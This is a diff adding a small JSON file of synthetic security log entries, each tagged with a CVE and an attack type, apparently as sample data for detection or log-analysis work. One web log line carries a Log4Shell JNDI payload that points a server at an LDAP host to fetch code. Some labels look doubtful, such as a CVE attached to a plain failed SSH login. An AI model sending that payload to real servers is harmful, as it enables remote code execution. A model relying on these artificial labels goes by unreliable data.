@@ -1,0 +1,23 @@
+[
+    {
+        "timestamp": "2026-01-14T14:52:00.511871",
+        "log_source": "web_logs",
+        "original_log": "2026-01-14T14:52:00.511871 192.168.1.110 - - \"GET /login?user=${jndi:ldap://10.0.0.28/exploit} HTTP/1.1\" 200 1024 \"Mozilla/5.0 (ExploitTool/1.0)\"",
+        "related_cve": "CVE-2021-44228",
+        "attack_type": "web_attack"
+    },
+    {
+        "timestamp": "2026-01-14T14:52:00.511871",
+        "log_source": "firewall",
+        "original_log": "2026-01-14T14:52:00.511871 FW-01 DENY src=192.168.1.163 dst=172.16.0.5 proto=TCPlen=9999 msg=\"Malformed Packet Detected (CVE-2020-11899)\"",
+        "related_cve": "CVE-2020-11899",
+        "attack_type": "network_exploit"
+    },
+    {
+        "timestamp": "2026-01-14T14:52:00.511871",
+        "log_source": "linux_auth",
+        "original_log": "2026-01-14T14:52:00.511871 web-server-01 sshd[9396]: Failed password for invalid user admin from 192.168.1.30 port 34833 ssh2",
+        "related_cve": "CVE-2023-0001",
+        "attack_type": "auth_attack"
+    }
+]
